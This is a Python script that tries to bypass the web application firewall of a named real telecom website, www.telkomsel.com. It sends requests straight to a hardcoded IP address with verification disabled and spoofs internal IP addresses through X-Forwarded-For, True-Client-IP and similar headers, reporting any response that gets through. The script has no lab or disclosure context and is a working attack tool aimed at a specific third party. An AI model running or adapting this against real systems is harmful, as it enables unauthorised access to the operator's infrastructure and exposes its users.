import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def bypass_request(url, host_header, spoof_ip):
    print(f"[*] Testing Bypass on {url} with Spoof IP: {spoof_ip}...")
    
    # Variations of headers to trick WAF
    headers_list = [
        {'Host': host_header, 'X-Forwarded-For': spoof_ip},
        {'Host': host_header, 'X-Real-IP': spoof_ip},
        {'Host': host_header, 'X-Forwarded-Host': host_header, 'X-Client-IP': spoof_ip},
        {'Host': host_header, 'X-Originating-IP': spoof_ip},
        {'Host': host_header, 'True-Client-IP': spoof_ip}
    ]
    
    for headers in headers_list:
        try:
            # Use the IP address directly in the URL to bypass DNS-based WAF
            target_url = url.replace(host_header, "43.255.196.45") # Direct IP access
            r = requests.get(target_url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            
            print(f"    - Header: {list(headers.keys())[1]} | Status: {r.status_code} | Size: {len(r.content)}")
            
            if r.status_code not in [432, 503, 403]:
                print(f"[!!!] BYPASS POTENTIAL DETECTED with {headers}")
                print(f"    Preview: {r.text[:200]}")
                return True
        except Exception as e:
            # print(f"[-] Error: {e}")
            pass
    return False

if __name__ == "__main__":
    target_host = "www.telkomsel.com"
    target_url = f"https://{target_host}/"
    
    # Internal IP ranges of Telkomsel/National
    internal_ips = ["10.49.8.173", "10.0.0.1", "172.16.0.1", "192.168.1.1", "43.255.196.1"]
    
    for ip in internal_ips:
        if bypass_request(target_url, target_host, ip):
            break
